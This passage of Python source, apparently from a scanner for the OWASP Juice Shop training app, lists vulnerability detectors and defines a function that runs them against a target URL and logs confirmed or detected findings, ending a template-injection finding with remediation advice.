                    remediation={"summary": "Never render user input as a template; use logic-less templates or a strict sandbox.", "fixes": []},
                    tags=["ssti", "csti", "confirmed", "exploit-guidance"],
                ))
    return findings


DETECTORS = [
    d_sqli_login, d_sqli_search, d_ftp, d_metrics, d_app_config,
    d_error_handling, d_scoreboard, d_rest_feedback, d_jwt, d_deprecated_b2b,
    d_tech_libs, d_reflection,
]


def run_detectors(base: str, log=None, auth=None) -> list[dict]:
    global _AUTH_HEADERS
    _AUTH_HEADERS = _hlist_to_dict(auth)
    if _AUTH_HEADERS and log:
        log(f"detectors: authenticated ({', '.join(_AUTH_HEADERS.keys())})", "info", "detect")
    base = base.rstrip("/")
    out = []
    js_ver = is_juice_shop(base)
    if log and js_ver:
        log(f"detectors: OWASP Juice Shop confirmed (v{js_ver}) at {base}", "ok", "detect")
    for det in DETECTORS:
        try:
            f = det(base)
            items = f if isinstance(f, list) else ([f] if f else [])
            for item in items:
                out.append(item)
                if log:
                    tag = "CONFIRMED" if item.get("confirmed") else "DETECTED"
                    chal = ", ".join(item.get("challenges", [])[:2])
                    log(f"{tag}: {item['title']}" + (f" [{chal}]" if chal else ""), "ok", "detect")
        except Exception as e:
            if log:
                log(f"detector {det.__name__} error: {type(e).__name__}", "warn", "detect")
    return out
